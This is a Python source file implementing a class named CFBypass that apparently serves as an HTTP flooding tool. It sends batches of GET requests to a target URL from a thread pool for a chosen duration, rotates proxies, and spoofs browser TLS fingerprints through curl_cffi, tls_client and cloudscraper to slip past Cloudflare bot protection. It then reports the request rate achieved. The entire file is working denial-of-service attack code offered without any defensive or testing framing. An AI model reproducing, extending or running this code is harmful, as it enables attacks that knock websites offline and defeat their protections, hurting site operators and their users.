import asyncio
from curl_cffi import requests as curl_requests
from tls_client import Session
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
import time
import random

class CFBypass:
    def __init__(self, target, threads, use_proxy=False, proxy_list=None, proxy_manager=None):
        self.target = target
        self.threads = threads
        self.use_proxy = use_proxy
        self.proxy_manager = proxy_manager
        self.sent = 0
        self.success = 0
        
        self.browsers = [
            'chrome110', 'chrome107', 'chrome104',
            'firefox110', 'firefox105',
            'safari15_5', 'safari15_3'
        ]
    
    def get_random_proxy(self):
        if self.use_proxy and self.proxy_manager:
            return self.proxy_manager.get_random_proxy()
        return None
    
    def method1_curl_impersonate(self):
        try:
            impersonate = random.choice(self.browsers)
            proxy = self.get_random_proxy()
            
            response = curl_requests.get(
                self.target,
                impersonate=impersonate,
                proxies={'http': proxy, 'https': proxy} if proxy else None,
                timeout=10,
                allow_redirects=True
            )
            
            if response.status_code in [200, 201, 301, 302, 403]:
                self.sent += 1
                if response.status_code == 200:
                    self.success += 1
                    
        except Exception:
            pass
    
    def method2_tls_client(self):
        try:
            session = Session(
                client_identifier=random.choice([
                    'chrome_105',
                    'chrome_104',
                    'firefox_105',
                    'safari_15_6_1'
                ]),
                random_tls_extension_order=True
            )
            
            proxy = self.get_random_proxy()
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
            
            response = session.get(self.target, timeout=10)
            
            if response.status_code in [200, 201, 301, 302]:
                self.sent += 1
                if response.status_code == 200:
                    self.success += 1
                    
        except Exception:
            pass
    
    def method3_cloudscraper_advanced(self):
        try:
            scraper = cloudscraper.create_scraper(
                browser={
                    'browser': random.choice(['chrome', 'firefox']),
                    'platform': random.choice(['windows', 'darwin', 'linux']),
                    'desktop': True
                },
                delay=random.uniform(1, 3)
            )
            
            proxy = self.get_random_proxy()
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            
            response = scraper.get(self.target, proxies=proxies, timeout=15)
            
            if response.status_code in [200, 201]:
                self.sent += 1
                self.success += 1
                
                cookies = scraper.cookies.get_dict()
                for _ in range(5):
                    scraper.get(self.target, cookies=cookies, proxies=proxies, timeout=10)
                    self.sent += 1
                    
        except Exception:
            pass
    
    def send_mixed_request(self):
        method = random.choice([
            self.method1_curl_impersonate,
            self.method2_tls_client,
            self.method3_cloudscraper_advanced
        ])
        method()
    
    async def run(self, duration):
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while time.time() - start < duration:
                futures = [executor.submit(self.send_mixed_request) for _ in range(50)]
                await asyncio.sleep(0.3)
        
        elapsed = time.time() - start
        print(f"CF-BYPASS | Sent: {self.sent} | Success: {self.success} | Rate: {self.sent/elapsed:.2f} req/s")